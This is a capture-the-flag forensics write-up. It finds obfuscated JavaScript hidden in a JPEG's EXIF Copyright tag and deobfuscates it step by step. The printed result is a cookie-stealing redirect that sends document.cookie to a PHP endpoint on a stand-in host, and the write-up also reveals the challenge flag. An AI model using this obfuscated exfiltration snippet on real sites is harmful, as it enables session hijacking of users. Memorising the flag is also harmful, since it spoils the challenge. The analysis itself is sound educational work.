# Change

## Task

One of Senork's employees opened a link in a phishing e-mail. After this, strange things happened. But this is likely related to the attached image. I have to check it.

File: change.jpg

Tags: forensics

## Solution

Analysing the file with exiftool:

```bash
$ exiftool change.jpg
```

We notice a strange `Copyright` tag containing code which appears to be javascript.

After beautifying it we need to deobfuscate the code.

There is an array containing strings `_0xb30f`:

```javascript
var _0xb30f = ['qep','0k5','app','ati','kro','fu5','tes','+(\x20','\x20+\x20','^([','LPa','uct','001','sys','Wor','s\x20+','+[^','\x20/\x22','7.0',')+)','ret','loc','\x20]+','ked','/12','htt','l1k','{l0','nCT','GyR','thi','log','3dj','\x20\x22/','LeT','Ryt','^\x20]','con','30b','str','c47'];
```

We notice a lot of calls to the function `_0x19ee` which is defined as:

```javascript
var _0x19ee = function(_0x430b89, _0xb30f10) {
    _0x430b89 = _0x430b89 - 0x0; // convert parameter to int
    var _0x19eed7 = _0xb30f[_0x430b89]; // lookup string in array
    return _0x19eed7;
};
```

This function resolves numbers stored as strings with the help of the above array.

We now can start to replace calls to this function with the corresponding entry.

```javascript
document[_0x19ee('0x9') + _0x19ee('0x20') + 'on'] = _0x19ee('0xd') + 'p:/' + _0x19ee('0xc') + _0x19ee('0x6') + '.0.' + '1/0' + _0x19ee('0x0') + '.ph' + 'p?c' + '=' + document['coo' + 'kie'], console[_0x19ee('0x13')](_0x19ee('0x2') + _0x19ee('0xb') + '!'), console[_0x19ee('0x13')](_0x19ee('0x1') + _0x19ee('0x21') + _0x19ee('0x10') + 'F'), console[_0x19ee('0x13')](_0x19ee('0xf') + _0x19ee('0x1e') + _0x19ee('0xe') + _0x19ee('0x1a') + _0x19ee('0x22') + _0x19ee('0x1c') + _0x19ee('0x14') + '5}');
```

which deobfuscates to:

```javascript
document['location'] = "http://127.0.0.1/0001.php?c=" + document['cookie'], console.log('Worked!'), console.log('syskronCTF'), console.log('{l00k5l1k30bfu5c473dj5}');
```
